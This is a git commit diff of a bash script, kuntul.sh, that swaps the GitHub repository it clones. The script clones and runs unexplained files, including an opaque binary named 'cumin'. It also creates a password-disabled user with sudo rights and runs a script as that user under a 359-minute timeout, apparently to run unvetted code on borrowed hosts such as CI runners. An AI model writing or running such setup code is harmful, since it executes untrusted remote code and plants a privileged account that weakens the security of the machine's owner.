0ebd8bab465c80d59550a004e6b41a42325447b3
bdjshz567 <86933721+bdjshz567@users.noreply.github.com>
2021-07-07 00:24:54 +0700

    Update kuntul.sh

--- kuntul.sh
+++ kuntul.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 sudo apt update
-git clone https://github.com/Hdjsg566/kampret.git && cd kampret
+git clone https://github.com/bdjshz567/kj.git && cd kj
 chmod +x okeh.sh && chmod +x cumin
 sudo adduser --disabled-password --gecos "" ikuk && sudo usermod -aG sudo ikuk
 sudo -u ikuk -H sh -c "timeout 359m ./okeh.sh"
